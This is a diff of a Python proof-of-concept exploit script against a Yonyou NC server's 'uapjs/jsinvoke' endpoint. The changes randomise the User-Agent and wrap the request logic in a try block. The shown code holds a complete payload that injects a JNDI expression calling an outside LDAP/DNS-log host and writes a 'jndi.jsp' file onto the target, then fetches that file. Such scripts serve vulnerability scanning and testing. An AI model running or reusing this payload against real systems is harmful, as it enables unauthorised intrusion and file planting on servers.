@@ -25,13 +25,14 @@ disable_warnings()
 path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
 sys.path.append(path)
 from modules.dnslogs import dnslogs
+from modules import get_user_agent
 
 
 class poc:
     def __init__(self, url, proxies):
         self.url = url
         self.headers = {
-            'User-Agent': 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)',
+            'User-Agent': get_user_agent.get_user_agent(),
             'Content-Type': 'application/x-www-formurlencoded',
         }
         self.result_text = ""
@@ -44,11 +45,11 @@ class poc:
         return netloc, scheme
 
     def vuln(self, netloc, scheme):
-        dnslog_all = dnslogs(self.proxies).get_dnslog()
-        dnslog = dnslog_all[0]
-        url = "{}://{}/uapjs/jsinvoke/?action=invoke".format(scheme, netloc)
-        data ="{\"serviceName\":\"nc.itf.iufo.IBaseSPService\",\"methodName\":\"saveXStreamConfig\",\"parameterTypes\":[\"java.lang.Object\",\"java.lang.String\"],\"parameters\":[\"${''.getClass().forName('javax.naming.InitialContext').newInstance().lookup('ldap://" + dnslog + "/exp')}\",\"webapps/nc_web/jndi.jsp\"]}"
         try:
+            dnslog_all = dnslogs(self.proxies).get_dnslog()
+            dnslog = dnslog_all[0]
+            url = "{}://{}/uapjs/jsinvoke/?action=invoke".format(scheme, netloc)
+            data ="{\"serviceName\":\"nc.itf.iufo.IBaseSPService\",\"methodName\":\"saveXStreamConfig\",\"parameterTypes\":[\"java.lang.Object\",\"java.lang.String\"],\"parameters\":[\"${''.getClass().forName('javax.naming.InitialContext').newInstance().lookup('ldap://" + dnslog + "/exp')}\",\"webapps/nc_web/jndi.jsp\"]}"
             result = requests.post(url=url, data=data, headers=self.headers, verify=False, proxies=self.proxies)
             result_url = '{}://{}/jndi.jsp'.format(scheme, netloc)
             requests.get(url=result_url, headers=self.headers, verify=False, proxies=self.proxies)
